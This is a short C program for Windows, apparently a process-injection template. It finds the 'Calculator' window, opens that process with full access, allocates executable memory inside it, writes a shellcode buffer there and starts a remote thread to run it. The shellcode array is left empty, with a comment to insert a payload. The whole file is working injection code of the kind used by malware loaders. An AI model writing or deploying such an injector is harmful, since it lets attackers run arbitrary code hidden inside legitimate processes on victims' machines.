#include <stdio.h>
#include <windows.h>
#include <process.h>

void inj(int PID) {
    char code[] = {}; // Put The Shellcode here
    HANDLE P ;   
    HANDLE T ; 
    void* exec_mem;
    P = OpenProcess(PROCESS_ALL_ACCESS,TRUE, PID);
    exec_mem = VirtualAllocEx(P,NULL,sizeof(code),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(P,exec_mem,code,sizeof(code),NULL);
    T = CreateRemoteThread(P,NULL,0,(LPTHREAD_START_ROUTINE)exec_mem,NULL,0,0);
    CloseHandle(P);
}
DWORD ProcessID;
int main()
{

    char exe[] = "Calculator"; // Window Name of the executable

    HWND hwnd = FindWindowA(0,(exe));

    GetWindowThreadProcessId(hwnd,&ProcessID);

    if (hwnd)
    {
        inj(ProcessID);
    }
    else
    {
        exit(0);
    }
    return 0;

}
